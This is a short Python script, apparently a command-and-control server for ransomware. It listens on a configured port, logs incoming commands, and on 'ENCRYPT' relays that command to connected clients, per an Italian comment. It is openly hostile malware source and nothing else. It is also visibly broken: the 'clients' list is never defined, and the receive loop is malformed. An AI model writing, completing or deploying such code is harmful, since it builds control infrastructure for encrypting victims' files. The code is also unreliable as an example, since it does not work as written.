import socket, json, os

with open('config.json') as f:
    config = json.load(f)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((config['bind_addr'], config['port']))
sock.listen(5)

print("C2 Server listening on port", config['port'])

while True:
    conn, addr = sock.accept()
    print(f"Connection from {addr}")
    
    data = b""
    while True:
        try:
            data += conn.recv(1024)
            if not data: break
        except: break
        
        if data:
            cmd = data.strip().decode('utf-8')
            print(f"Command: {cmd}")
            
            if cmd == "ENCRYPT":
                # invia comando ai client connessi
                for c in clients:
                    c.send(b"ENCRYPT")
